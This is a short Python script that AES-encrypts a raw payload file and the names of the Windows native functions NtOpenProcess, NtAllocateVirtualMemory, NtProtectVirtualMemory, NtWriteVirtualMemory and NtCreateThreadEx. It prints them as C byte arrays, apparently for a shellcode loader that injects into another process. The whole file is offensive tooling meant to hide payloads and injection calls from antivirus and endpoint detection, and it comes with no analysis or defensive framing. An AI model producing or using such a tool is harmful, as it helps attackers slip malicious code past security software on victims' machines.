

import sys
from Crypto.Cipher import AES
from os import urandom
import hashlib

KEY = urandom(16)

def pad(s):
	return s + (AES.block_size - len(s) % AES.block_size) * chr(AES.block_size - len(s) % AES.block_size)

def aesenc(plaintext, key):

	k = hashlib.sha256(key).digest()
	iv = 16 * '\x00'
	plaintext = pad(plaintext)
	cipher = AES.new(k, AES.MODE_CBC, iv)

	return cipher.encrypt(bytes(plaintext))

try:
    plaintext = open(sys.argv[1], "r").read()
except:
    print("File argument needed! %s <raw payload file>" % sys.argv[0])
    sys.exit()

ciphertext = aesenc(plaintext, KEY)
NtOpenProcess = aesenc("NtOpenProcess\x00", KEY)
NtAllocateVirtualMemory  = aesenc("NtAllocateVirtualMemory\x00",KEY)
NtProtectVirtualMemory = aesenc("NtProtectVirtualMemory\x00", KEY)
NtWriteVirtualMemory = aesenc("NtWriteVirtualMemory\x00", KEY)
NtCreateThreadEx = aesenc("NtCreateThreadEx\x00", KEY)


print('AESkey[] = { 0x' + ', 0x'.join(hex(ord(x))[2:] for x in KEY) + ' };')
print('NtOpenProcess[] = { 0x' + ', 0x'.join(hex(ord(x))[2:] for x in NtOpenProcess) + ' };')
print('NtAllocateVirtualMemory[] = { 0x' + ', 0x'.join(hex(ord(x))[2:] for x in NtAllocateVirtualMemory) + ' };')
print('NtProtectVirtualMemory[] = { 0x' + ', 0x'.join(hex(ord(x))[2:] for x in NtProtectVirtualMemory) + ' };')
print('NtWriteVirtualMemory[] = { 0x' + ', 0x'.join(hex(ord(x))[2:] for x in NtWriteVirtualMemory) + ' };')
print('NtCreateThreadEx[] = { 0x' + ', 0x'.join(hex(ord(x))[2:] for x in NtCreateThreadEx) + ' };')
print('payload[] = { 0x' + ', 0x'.join(hex(ord(x))[2:] for x in ciphertext) + ' };')

